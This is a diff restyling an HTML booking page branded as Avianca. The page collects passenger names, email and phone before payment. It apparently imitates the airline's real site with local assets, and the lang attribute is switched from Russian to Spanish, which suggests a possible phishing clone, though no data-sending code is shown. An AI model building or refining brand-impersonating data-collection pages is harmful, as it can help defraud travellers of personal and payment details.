@@ -1,132 +1,225 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Avianca - Booking</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="./css/flight.css">
-    <link rel="stylesheet" href="./css/normalize.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Avianca - Booking</title>
 
-    <!-- START -->
-    <script src="./js/functions.js"></script>
+  <!-- Fuentes -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@400;500;600;700;800;900&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+
+  <!-- Estilos base del proyecto -->
+  <link rel="stylesheet" href="./css/normalize.css">
+  <link rel="stylesheet" href="./css/flight.css">
+
+  <!-- UI unificada (misma que usar para selección de vuelos) -->
+  <link rel="stylesheet" href="./css/flights-ui.css">
+
+  <!-- Utilidades y datos compartidos -->
+  <script src="./js/functions.js"></script>
+
+  <style>
+    /* Ajustes mínimos específicos de esta vista (sin tocar tu CSS global) */
+    .av-topbar {
+      position: sticky; top: 0; z-index: 5;
+      background:#0e0e0f; color:#fff; border-bottom: 1px solid rgba(255,255,255,.08);
+    }
+    .av-topbar__wrap {
+      max-width: 1180px; margin: 0 auto; padding: 12px 16px;
+      display:flex; align-items:center; justify-content:space-between; gap:16px;
+    }
+    .av-topbar__left { display:flex; align-items:center; gap:16px; flex-wrap: wrap; }
+    .av-logo { height:22px; }
+    .av-route { display:flex; align-items:center; gap:10px; font-weight:700; }
+    .av-route img { width:14px; opacity:.75 }
+    .av-date { font-weight:500; opacity:.85; margin-left:6px; }
+    .av-topbar__right { display:flex; align-items:center; gap:16px; }
+    .av-step { font-weight:600; opacity:.9; }
+    .av-total { background:#1b1b1d; padding:8px 12px; border-radius:22px; font-weight:800; }
+
+    /* contenedor principal con el mismo ritmo que en vuelos */
+    main.av-main { padding: 24px 16px 56px; max-width:1180px; margin:0 auto; }
+
+    /* tarjeta del formulario */
+    .av-card {
+      background: #fff; border-radius:18px;
+      box-shadow: 0 2px 16px rgba(13,16,23,.06);
+      padding: 20px; margin-bottom: 18px;
+    }
+    .av-card h2 { margin:0 0 6px 0; font-size:20px; }
+    .av-card h3 { margin:16px 0 6px 0; font-size:16px; opacity:.9 }
+    .av-form-grid { display:grid; gap:12px; }
+    .btn.btn-gray { min-height:44px; border-radius:12px; }
+
+    /* footer relajado (no fijo) */
+    .av-footer { padding:14px 16px 28px; }
+    .footer-flight-resume {
+      background:#fff; border-radius:16px;
+      box-shadow:0 2px 16px rgba(13,16,23,.06);
+      padding:14px 16px; display:flex; justify-content:space-between; gap:16px; align-items:center;
+      max-width:1180px; margin:0 auto;
+    }
+    .av-footer p { text-align:center; opacity:.7; margin-top:10px }
+    /* móvil */
+    @media (max-width: 768px){
+      .av-topbar__wrap { padding:10px 12px; }
+      .av-total { padding:6px 10px; }
+      main.av-main { padding: 16px 12px 52px; }
+      .footer-flight-resume { flex-direction:column; align-items:flex-start; }
+    }
+  </style>
 </head>
-<body class="mvh-100 sb-hidden bg-gray">
 
-    <!-- ON LOADER -->
-    <div class="loader show">
-        <img class="" src="./assets/svg/plane-loader.gif">
+<body class="bg-gray">
+
+  <!-- Topbar consistente -->
+  <header class="av-topbar">
+    <div class="av-topbar__wrap">
+      <div class="av-topbar__left">
+        <img src="./assets/svg/a_logo.svg" alt="Avianca" class="av-logo">
+        <div class="av-route">
+          <span id="tb-origin">—</span>
+          <img src="./assets/svg/arrow.png" alt="">
+          <span id="tb-dest">—</span>
+          <span class="av-date" id="tb-date">—</span>
+        </div>
+      </div>
+      <div class="av-topbar__right">
+        <span class="av-step">Paso 2 de 5</span>
+        <span class="av-total">USD <span id="tb-total">0,00</span></span>
+      </div>
     </div>
+  </header>
 
+  <main class="av-main">
+    <!-- Datos personales -->
+    <section class="av-card">
+      <h2>Datos personales</h2>
 
-    <header>
-        <div class="next-step">
-            <img class="ns-logo" src="./assets/logos/avianca_red.svg">
-            <div class="ns-step">
-                <img src="./assets/svg/step_2_header.png">
-            </div>
+      <select id="select-passengers"></select>
+
+      <h3>Pasajero – <span id="editing-label">Adulto 1</span></h3>
+      <p class="fs-4">Ingresa el nombre y primer apellido (de cada pasajero) tal y como aparecen en el pasaporte o documento de identidad. También, agrega el número de viajero frecuente LifeMiles o de una aerolínea aliada para disfrutar de más beneficios.</p>
+
+      <div class="av-form-grid">
+        <div>
+          <input id="name" type="text" placeholder="Nombre">
+          <span name="name-error" class="input-error-label">Por favor, ingresa tu primer nombre</span>
         </div>
-    </header>
-
-    <main>
-        <div class="main-form mb-10">
-            <form class="form-control" id="next-step">
-
-                <div class="form-section">
-                    <div class="form-title">
-                        <h2>Datos personales</h2>
-                        <img src="./assets/svg/arrow_top.png" alt="">
-                    </div>
-
-                    <select id="select-passengers">
-                    </select>
-
-                    <h3>Pasajero - <span id="editing-label">Adulto 1</span></h3>
-                    <p class="fs-4">Ingresa el nombre y primer apellido (de cada pasajero) tal y como aparecen en el pasaporte o documento de identidad. También, agrega el número de viajero frecuente LifeMiles o de una aerolínea aliada para disfrutar de más beneficios.</p>
-                    
-                    <input id="name" class="mt-5" type="text" placeholder="Nombre">
-                    <span name="name-error" class="input-error-label">Por favor, ingresa tu primer nombre</span>
-                    <input id="surname" class="mt-4" type="text" placeholder="Apellido" >
-                    <span name="surname-error" class="input-error-label">Por favor, ingresa tu primer apellido</span>
-
-
-                    <div class="checkbox-group mt-4">
-                        <input class="check" type="checkbox">
-                        <label for="">Tengo un número de viajero frecuente <span class="bold-gray">LifeMiles</span> o de otra aerolínea aliada (opcional).</label>
-                    </div>
-                    <div class="checkbox-group mt-2">
-                        <input class="check" type="checkbox">
-                        <label for="">Necesito asistencia especial (opcional)</label>
-                    </div>
-                    
-
-                    <div class="mt-4 show justify-content-center">
-                        <button id="btn-next-passenger" type="button" class="btn btn-gray">
-                            Próximo Pasajero
-                        </button>
-                    </div>
-                </div>
-                
-
-                <hr>
-
-                <div class="form-section">
-                    <div class="form-info">
-                        <img src="./assets/svg/tel_icon.png" alt="" width="25px" height="25px" style="margin-right: 12px;">
-                        <div>
-                            <p class="fs-2">Información de contacto</p>
-                            <p class="fs-4 mt-2">Estos datos serán utilizados para informarte sobre tu reserva.</p>
-                        </div>
-                    </div>
-
-                    <input id="email" class="mt-5" type="email" placeholder="Correo">
-                    <span name="name-error" class="input-error-label">Por favor, ingresa tu correo</span>
-                    <input id="number" class="mt-4" type="number" placeholder="Número de teléfono" oninput="limitDigits(this, 10)">
-                    <span name="name-error" class="input-error-label">Por favor, ingresa tu número de teléfono</span>
-
-                    <div class="checkbox-group mt-4">
-                        <input class="check" type="checkbox" name="" id="">
-                        <label for="">Acepto el uso de mis datos personales para recibir promociones, ofertas y novedades que Avianca tiene para mí.</label>
-                    </div>
-
-                    <div class="mt-4 show justify-content-center">
-                        <button type="submit" class="btn btn-gray">
-                            Continuar a pagar
-                        </button>
-                    </div>
-                </div>
-
-            </form>
+        <div>
+          <input id="surname" type="text" placeholder="Apellido">
+          <span name="surname-error" class="input-error-label">Por favor, ingresa tu primer apellido</span>
         </div>
-    </main>
+      </div>
 
-    <footer class="footer-fixed-2">
-        <div class="footer-flight-resume">
-            <div>
-                <p class="mb-1">Resumen del viaje:</p>
-                <div class="show align-items-center">
-                    <h4 id="origin-code">BOG</h4>
-                    <img src="./assets/svg/arrow.png" width="14px">
-                    <h4 id="destination-code">CLI</h4>
-                </div>
-            </div>
-            <div>
-                <h4 class="text-end mt-1">$<span id="flight-cost">49.999</span> USD</h4>
-                <p class="fs-5">Total de tu reserva:</p>
-                <img src="./assets/svg/info_icon.png" width="15px">
-            </div>
+      <div class="checkbox-group mt-4">
+        <input class="check" type="checkbox" id="cb-lifemiles">
+        <label for="cb-lifemiles">Tengo un número de viajero frecuente <span class="bold-gray">LifeMiles</span> o de otra aerolínea aliada (opcional).</label>
+      </div>
+      <div class="checkbox-group mt-2">
+        <input class="check" type="checkbox" id="cb-asistencia">
+        <label for="cb-asistencia">Necesito asistencia especial (opcional)</label>
+      </div>
+
+      <div class="mt-4 show justify-content-center">
+        <button id="btn-next-passenger" type="button" class="btn btn-gray">Próximo pasajero</button>
+      </div>
+    </section>
+
+    <!-- Información de contacto -->
+    <section class="av-card">
+      <div class="form-info" style="display:flex;align-items:center">
+        <img src="./assets/svg/tel_icon.png" alt="" width="22" height="22" style="margin-right:10px;">
+        <div>
+          <p class="fs-2" style="margin:0">Información de contacto</p>
+          <p class="fs-4 mt-2">Estos datos serán utilizados para informarte sobre tu reserva.</p>
         </div>
+      </div>
 
-        <p class="mt-2 mb-2">© Avianca S.A 2024</p>
-    </footer>
+      <div class="av-form-grid" style="margin-top:12px">
+        <div>
+          <input id="email" type="email" placeholder="Correo">
+          <span name="name-error" class="input-error-label">Por favor, ingresa tu correo</span>
+        </div>
+        <div>
+          <input id="number" type="number" placeholder="Número de teléfono" oninput="limitDigits(this, 10)">
+          <span name="name-error" class="input-error-label">Por favor, ingresa tu número de teléfono</span>
+        </div>
+      </div>
 
-    <!-- SCRIPTS -->
-    <script src="./js/step-two.js"></script>
+      <div class="checkbox-group mt-4">
+        <input class="check" type="checkbox" id="cb-promos">
+        <label for="cb-promos">Acepto el uso de mis datos personales para recibir promociones, ofertas y novedades que Avianca tiene para mí.</label>
+      </div>
+
+      <div class="mt-4 show justify-content-center">
+        <button type="button" class="btn btn-gray" onclick="document.getElementById('next-step-form-submit').click()">Continuar a pagar</button>
+      </div>
+
+      <!-- Botón real del form (permite seguir usando tu step-two.js si lo esperara) -->
+      <form id="next-step" class="hide">
+        <button id="next-step-form-submit" type="submit">submit</button>
+      </form>
+    </section>
+  </main>
+
+  <!-- Footer relajado (no fixed) -->
+  <footer class="av-footer">
+    <div class="footer-flight-resume">
+      <div>
+        <p class="mb-1">Resumen del viaje:</p>
+        <div class="show align-items-center">
+          <h4 id="origin-code">—</h4>
+          <img src="./assets/svg/arrow.png" width="14" alt="">
+          <h4 id="destination-code">—</h4>
+        </div>
+      </div>
+      <div>
+        <h4 class="text-end mt-1">USD <span id="flight-cost">0,00</span></h4>
+        <p class="fs-5">Total de tu reserva:</p>
+        <img src="./assets/svg/info_icon.png" width="15" alt="">
+      </div>
+    </div>
+    <p class="mt-2 mb-2">© Avianca S.A 2024</p>
+  </footer>
+
+  <!-- Tu JS de esta página -->
+  <script src="./js/step-two.js"></script>
+
+  <!-- Relleno del topbar/resumen usando los mismos datos globales -->
+  <script>
+    (function () {
+      try {
+        // info viene de localStorage, mismo que usas en otras pantallas (functions.js)
+        const info = JSON.parse(localStorage.getItem('info') || '{}');
+
+        // Ruta + fecha
+        const o = info?.flightInfo?.origin?.code || document.getElementById('origin-code')?.textContent || '—';
+        const d = info?.flightInfo?.destination?.code || document.getElementById('destination-code')?.textContent || '—';
+        const dateStr = (info?.flightInfo?.flightDates?.[0]) ? (()=>{
+          const [y,m,day]=info.flightInfo.flightDates[0].split('-').map(Number);
+          const dt = new Date(y, m-1, day);
+          return dt.toLocaleDateString('es-EC', { weekday:'short', day:'2-digit', month:'short', year:'numeric' });
+        })() : '';
+
+        document.getElementById('tb-origin').textContent = o;
+        document.getElementById('tb-dest').textContent   = d;
+        document.getElementById('tb-date').textContent   = dateStr;
+
+        // Totales (usa el total que ya guardas; si no, cae al de footer)
+        const total = (info?.totalPrice || '').toLocaleString?.('es-EC', {minimumFractionDigits:2, maximumFractionDigits:2}) ||
+                      (document.getElementById('flight-cost')?.textContent || '0,00');
+
+        document.getElementById('tb-total').textContent   = total;
+        document.getElementById('flight-cost').textContent = total;
+
+        // Resumen del footer
+        document.getElementById('origin-code').textContent      = o;
+        document.getElementById('destination-code').textContent = d;
+      } catch(e) { /* no-op */ }
+    })();
+  </script>
 </body>
 </html>
